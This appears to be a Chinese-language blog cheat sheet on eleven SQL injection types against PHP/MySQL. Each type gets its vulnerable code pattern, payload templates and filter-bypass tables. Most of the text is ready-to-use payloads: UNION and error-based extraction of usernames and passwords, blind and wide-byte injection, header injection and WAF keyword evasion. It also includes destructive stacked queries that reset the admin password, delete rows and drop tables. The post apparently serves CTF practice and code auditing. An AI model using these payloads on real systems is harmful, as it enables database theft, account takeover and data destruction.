---
title: SQL 注入类型
date: 2026-08-28 12:40:00
categories:
  - Web安全
tags:
  - SQL注入
description: SQL 注入各类型原理与注入模板速查
---

## 1. 数字型注入
**原理**：参数为数字直接拼 SQL，无引号包裹，输入 `'` 直接报错。

**代码特征**：参数直接拼接，无任何引号包裹。

```php
$sql = "SELECT * FROM users WHERE id = ".$_GET['id'];
```

**危险函数**：

```php
mysqli_query($conn, $sql)    // MySQLi 过程化
$pdo->query($sql)            // PDO
mysql_query($sql)            // 老版本 MySQL 扩展
```

---

### 注入模板
```sql
-- ① 判断列数
?id=1 order by 3--+

-- ② 判断回显位
?id=-1 union select 1,2,3--+

-- ③ 查库名
?id=-1 union select 1,database(),3--+

-- ④ 查表名
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+

-- ⑤ 查列名
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名'--+
?id=-1 union select 1,column_name,3 from information_schema.columns where table_name='表名' limit 0,1--+

-- ⑥ 拿数据
?id=-1 union select 1,group_concat(username,0x3a,password),3 from 表名--+
?id=-1 union select 1,concat(username,0x3a,password),3 from 表名 limit 0,1--+

-- ⑦ 显示不全（substr 分段读，每段32位）
?id=-1 union select 1,substr(group_concat(flag),1,32),3 from flag--+
?id=-1 union select 1,substr(group_concat(flag),33,32),3 from flag--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 示例 |
| --- | --- | --- |
| 空格 | `/**/` `%09` `%0a` 括号 | `?id=1/**/union/**/select/**/1,2,3--+` |
| union select | 双写、内联注释、换行 | `?id=1 ununionion seselectlect 1,2,3--+` |
| and / or | `&&`、 双写   | `?id=1 && 1=1` `?id=1 anAndd 1=1` |
| 单引号 | 十六进制字符串 | `table_name=0x7573657273` |
| 等号 = | `like` `regexp` `>` `<` | `?id=1 and 1 like 1--+` |
| 注释 # -- | `;%00` 闭合后引号 | `?id=1 union select 1,2,3;%00` |
| 逗号 , | `from x for y` `join` | `substr((select database())from 1 for 1)` |
| sleep | `benchmark()` | `and benchmark(10000000,md5(1))--+` |
| information_schema | `sys.schema_auto_increment_columns` | `select table_name from sys.schema_auto_increment_columns` |
| order by | `group by` | `?id=1 group by 3--+` |


---

## 2. 字符型注入
**原理**：参数用单/双引号包裹，需闭合引号再注入。

**代码特征**：参数被单引号或双引号包裹。

```php
$sql = "SELECT * FROM users WHERE username = '{$_GET['user']}'";
$sql = "select passwd from user where username='".$username."' order by id limit 1;";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
$pdo->query($sql)
```

---

### 注入模板
```sql
-- ① 判断列数
?user=admin' order by 3--+

-- ② 判断回显位
?user=admin' and 1=2 union select 1,2,3--+

-- ③ 查库名
?user=admin' and 1=2 union select 1,database(),3--+

-- ④ 查表名
?user=admin' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?user=admin' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--+

-- ⑤ 查列名
?user=admin' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名'--+

-- ⑥ 拿数据
?user=admin' and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+

-- ⑦ 显示不全
?user=admin' and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 示例 |
| --- | --- | --- |
| 单引号 | 宽字节 `%df'` 十六进制 | `?id=1%df' union select 1,2,3--+` |
| addslashes() | 宽字节、二次注入 | `%df'` 吃反斜杠 |
| 双引号 | 先闭合双引号 | `?user=admin" and 1=2 union select 1,2,3--+` |
| 空格/关键字 | 同数字型 | 双写、大小写、注释 |


---

## 3. 搜索型注入（LIKE）
**原理**：用户输入拼入 `LIKE '%...%'`，开发以为有 % 包裹就安全。

**代码特征**：参数在 `'%...%'` 中间。

```php
$sql = "SELECT * FROM users WHERE name LIKE '%{$_GET['kw']}%'";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
```

---

### 注入模板
```sql
-- ① 闭合测试
?kw=%' and 1=1--+
?kw=%' and 1=2--+

-- ② 查库名
?kw=%' and 1=2 union select 1,database(),3--+

-- ③ 查表名
?kw=%' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- ④ 查列名
?kw=%' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名'--+

-- ⑤ 拿数据
?kw=%' and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+

-- ⑥ 显示不全
?kw=%' and 1=2 union select 1,substr(group_concat(flag),1,32),3 from flag--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| 单引号 | 宽字节 `%df%25'` | % 也要考虑编码 |
| 百分号 % | `_` 匹配单字符 | `LIKE '_dmin'` |
| 空格/关键字 | 同字符型 | 双写、大小写 |


---

## 4. 排序注入（ORDER BY）
**原理**：`ORDER BY` 后字段名用户可控，无法预编译，开发直接拼接。**重灾区**。

**代码特征**：参数在 `ORDER BY` 后面，通常是排序字段或排序方式。

```php
$sql = "SELECT * FROM users ORDER BY {$_GET['sort']}";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
```

---

### 注入模板
```sql
-- ===== 报错注入（首选） =====

-- 查库名
?sort=updatexml(1,concat(0x7e,database(),0x7e),1)

-- 查表名
?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)

-- 查列名
?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名'),0x7e),1)

-- 拿数据
?sort=updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)

-- 显示不全
?sort=updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)


-- ===== 布尔盲注（无报错时用） =====

-- 库名长度
?sort=if(length(database())=8,id,username)

-- 逐字猜库名
?sort=if(ascii(substr(database(),1,1))=115,id,username)


-- ===== 时间盲注 =====

?sort=if(1=1,sleep(5),id)
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 示例 |
| --- | --- | --- |
| 逗号 , | `from x for y` | `substr((select database())from 1 for 1)` |
| if() | `case when ... then ... end` | `?sort=case when 1=1 then id else username end` |
| sleep | `benchmark()` | `?sort=if(1=1,benchmark(10000000,md5(1)),id)` |
| updatexml | `extractvalue()` `floor()` | `?sort=extractvalue(1,concat(0x7e,database()))` |
| 空格 | `/**/` 括号 | 注释代替空格 |


---

## 5. LIMIT 注入
**原理**：`LIMIT` 后偏移量/数量用户可控，直接拼接。

**代码特征**：参数在 `LIMIT` 后面，常见于分页。

```php
$sql = "SELECT * FROM users LIMIT {$_GET['page']},10";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
```

---

### 注入模板
```sql
-- ===== 报错注入（PROCEDURE ANALYSE） =====

-- 查库名
?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--+

-- 查表名
?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)--+

-- 显示不全
?page=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32))),1)--+


-- ===== 联合注入（后面无 ORDER BY 时） =====

?page=1 UNION SELECT 1,2,3--+


-- ===== 时间盲注 =====

?page=1 and sleep(5)--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 示例 |
| --- | --- | --- |
| 逗号 , | `OFFSET` 语法 | `LIMIT 10 OFFSET 1` |
| 数字 | 运算代替 | `1+1` `2*1` |
| PROCEDURE | 换 UNION 或盲注 | 换注入方式 |


---

## 6. IN 注入
**原理**：`IN (...)` 括号内参数用户可控，直接拼接。

**代码特征**：参数在 `IN (...)` 括号内。

```php
$sql = "SELECT * FROM users WHERE id IN ({$_GET['ids']})";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
```

---

### 注入模板
```sql
-- ① 闭合测试
?ids=1) and 1=1--+

-- ② 查库名
?ids=1) and 1=2 union select 1,database(),3--+

-- ③ 查表名
?ids=1) and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- ④ 查列名
?ids=1) and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名'--+

-- ⑤ 拿数据
?ids=1) and 1=2 union select 1,group_concat(username,0x3a,password),3 from users--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| 逗号 | UNION 逐行查 | 不用 group_concat |
| 括号 | OR 条件代替 | `id=1 OR 1=2 UNION SELECT...` |
| 空格/关键字 | 同数字型 | 双写、大小写 |


---

## 7. INSERT / UPDATE / DELETE 注入
**原理**：增删改语句中存在注入，通常用报错注入或时间盲注。

**代码特征**：INSERT / UPDATE / DELETE 语句中直接拼接用户输入。

```php
// INSERT
$sql = "INSERT INTO users(username,password) VALUES ('{$_POST['user']}','{$_POST['pass']}')";
// UPDATE
$sql = "UPDATE users SET password='{$_POST['pass']}' WHERE id={$_GET['id']}";
// DELETE
$sql = "DELETE FROM users WHERE id={$_GET['id']}";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
mysqli_multi_query($conn, $sql)   // 支持堆叠
```

---

### 注入模板
```sql
-- ===== 报错注入（首选） =====

-- 查库名
username=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)#

-- 查表名
username=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#

-- 查列名
username=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名'),0x7e),1)#

-- 拿数据
username=admin' and updatexml(1,concat(0x7e,(select group_concat(flag) from flag),0x7e),1)#

-- 显示不全
username=admin' and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,32),0x7e),1)#


-- ===== 时间盲注（无报错时用） =====

username=admin' and if(1=1,sleep(5),0)#
```

---

### 过滤绕过速查
同字符型注入。重点：单引号→宽字节/十六进制，关键字→双写/大小写，updatexml→extractvalue/floor。

---

## 8. 堆叠注入
**原理**：数据库支持多语句执行，用 `;` 分隔执行多条 SQL。

**代码特征**：使用支持多语句执行的函数。

```php
mysqli_multi_query($conn, $sql);
```

PDO 默认不支持，需 `PDO::ATTR_EMULATE_PREPARES => true`。

**危险函数**：

```php
mysqli_multi_query($conn, $sql)
```

---

### 注入模板
```sql
-- 查库
?id=1;show databases;

-- 查表
?id=1;use 库名;show tables;
-- 查当前库的表
1';show tables;

-- 查列
?id=1;show columns from 表名;
?id=1;use 库名;show columns from 表名;

-- 查内容（handler 绕过 select 过滤）
?id=1;use 库名;handler 表名 open;handler 表名 read first;

-- 改数据（最常用）
?id=1;update users set password='123456' where username='admin';

-- 删数据
?id=1;delete from users where id=1;

-- 删表
?id=1;drop table 表名;

-- 查当前用户/版本
?id=1;select user();
?id=1;select version();
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| 分号 ; | 过滤了就没了，换报错/盲注 | 堆叠全靠分号 |
| select | 用 show 代替查tables | `show tables` |
| select | handler  查内容 | handler 表名 open;handler 表名 read first; |


---

## 9. 二次注入
**原理**：输入入库时转义了，出库取出后直接拼 SQL，反斜杠消失，触发注入。

**代码特征**：入库有过滤，出库直接拼 SQL。

```php
// 入库时转义（看似安全）
$username = addslashes($_POST['username']);
$sql = "INSERT INTO users(username) VALUES ('$username')";

// 出库时直接拼（实际危险）
$row = mysqli_fetch_assoc($result);
$sql2 = "SELECT * FROM users WHERE username = '{$row['username']}'";
```

**危险函数**：

```php
addslashes()          // 入库时用的，出库后反斜杠没了
mysqli_query()        // 出库后拼 SQL 执行
```

---

### 注入模板
```sql
-- ===== 第一步：注册带注入的账号 =====

username=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)#
password=123456


-- ===== 第二步：触发注入（登录/修改密码/查询等） =====

-- 用刚才注册的账号登录，出库时拼 SQL 自动触发
username=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)#
password=123456
```

> 触发点取决于业务：修改密码、个人信息查询、留言展示等，只要从数据库取出来拼 SQL 的地方都能触发。
>

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| 入库 addslashes | 没用，出库反斜杠就没了 | 二次注入核心就是绕这个 |
| 出库也转义 | 那就安全了 | 但很少有开发这么做 |
| 关键字过滤 | 同字符型绕过 | 双写、大小写 |


---

## 10. Cookie / Header 注入
**原理**：注入点在 Cookie 或 HTTP 请求头中，开发只过滤了 GET/POST。

**代码特征**：参数来源是 `$_COOKIE` 或 `$_SERVER`。

```php
// Cookie 注入
$id = $_COOKIE['id'];
$sql = "SELECT * FROM users WHERE id = $id";

// UA 注入
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO log(ua) VALUES ('$ua')";

// XFF 注入
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$sql = "INSERT INTO log(ip) VALUES ('$ip')";
```

**危险函数**：

```php
mysqli_query($conn, $sql)
```

---

### 注入模板
```http
-- ===== Cookie 注入 =====

Cookie: id=1 and 1=2 union select 1,database(),3--+


-- ===== UA 注入 =====

User-Agent: ' and updatexml(1,concat(0x7e,database(),0x7e),1)#


-- ===== X-Forwarded-For 注入 =====

X-Forwarded-For: 127.0.0.1' and updatexml(1,concat(0x7e,database(),0x7e),1)#


-- ===== Referer 注入 =====

Referer: ' and 1=2 union select 1,database(),3--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| 只过滤 GET/POST | 换 Cookie/Header 注入 | 审计最容易漏的地方 |
| IP 格式校验 | XFF 多个 IP 逗号分隔 | `127.0.0.1, '注入语句'` |
| Cookie 编码 | URL 编码后再传 | 看后端有没有 urldecode |


---

## 11. 宽字节注入
**原理**：数据库用 GBK 等宽字节编码，`addslashes()` 转义的 `\'` 被 `%df` 吃掉变成汉字，单引号逃逸。

**代码特征**：有转义 + 数据库宽字节编码 + 没设正确连接字符集。

```php
$id = addslashes($_GET['id']);
$sql = "SELECT * FROM users WHERE id = '$id'";
// 数据库字符集：GBK / gbk / gb2312
```

**危险函数**：

```php
addslashes()                      // 转义函数
mysql_query() / mysqli_query()    // 执行 SQL
```

---

### 注入模板
```sql
-- ① 测试闭合
?id=1%df' and 1=1--+
?id=1%df' and 1=2--+

-- ② 查库名
?id=-1%df' union select 1,database(),3--+

-- ③ 查表名
?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- ④ 查列名（表名用十六进制，避免单引号）
?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+

-- ⑤ 拿数据
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users--+

-- ⑥ 显示不全
?id=-1%df' union select 1,substr(group_concat(flag),1,32),3 from flag--+
```

---

### 过滤绕过速查
| 过滤 | 绕过 | 说明 |
| --- | --- | --- |
| addslashes() | `%df'` 宽字节 | 核心绕过方式 |
| mysql_real_escape_string() | 没设 `mysql_set_charset('gbk')` 也能绕 | 设了就安全了 |
| 单引号 | 十六进制字符串 | `table_name=0x7573657273` |
| 空格/关键字 | 同字符型 | 双写、大小写 |


---

## 附录：黑名单函数替代速查表
| 被过滤 | 替代方案 |
| --- | --- |
| **updatexml** | `extractvalue()` `floor()` `exp()` |
| **extractvalue** | `updatexml()` `floor()` |
| **floor** | `updatexml()` `extractvalue()` |
| **sleep** | `benchmark(10000000,md5(1))` |
| **if** | `case when ... then ... end` `elt()` `field()` |
| **substr** | `mid()` `substring()` `left()` `right()` |
| **group_concat** | `concat_ws()` + limit 逐行 |
| **concat** | `concat_ws()` `group_concat()` |
| **union select** | 报错注入、盲注、`/*!union*/ /*!select*/` |
| **information_schema** | `sys.schema_auto_increment_columns` `mysql.innodb_table_stats` |
| **and** | `&&` `anAndd` 双写 |
| **or** | `oorr` 双写   |
| **select** | 大小写 `SeLeCt` 双写 `selselectect` |
| **from** | 双写 `frfromom` |
| **where** | 双写 `whwhereere` |
| **order by** | `group by` |
| **空格** | `/**/` `%09` `%0a` `%0d` `%a0` 括号 `()` |
| **逗号 ,** | `from x for y` `join` `offset` |
| **等号 =** | `like` `regexp` `>` `<` `!=` |
| **注释 # --** | `;%00` `/*...*/` |
| **单引号 '** | 宽字节 `%df'` 十六进制 `0x...` |
| **百分号 %** | `_` 匹配单字符 |
| **limit** | `limit 1 offset 0` |


---

## 审计速记口诀
> **找输入 → 找 SQL → 看拼接 → 判类型 → 测过滤 → 选姿势**
>
> **有回显用联合，有报错用报错，都没有用盲注**
>
> **90% 的注入出在 order by、like、in、数字型无过滤这四个地方**
>
